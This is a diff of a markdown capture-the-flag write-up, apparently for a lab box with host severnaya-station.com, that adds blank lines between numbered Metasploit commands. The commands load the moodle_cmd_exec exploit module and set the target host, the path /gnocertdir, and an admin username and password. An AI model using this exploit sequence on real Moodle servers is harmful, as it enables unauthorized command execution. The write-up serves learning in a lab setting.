@@ -135,9 +135,13 @@ Looking into the source code of the module i found **TinyMCE HTML editor** and w
 Now its time to run the metasploit again with the help of this command
 
 1.use exploit/multi/http/moodle_cmd_exec
+
 2.msf exploit(moodle_cmd_exec) > set rhost severnaya-station.com
+
 3.msf exploit(moodle_cmd_exec) > set targeturi /gnocertdir
+
 4.msf exploit(moodle_cmd_exec) > set username admin
+
 5.msf exploit(moodle_cmd_exec) > set password xWinter1995x!
 
 <img src="Images/22.JPG" width="500px">
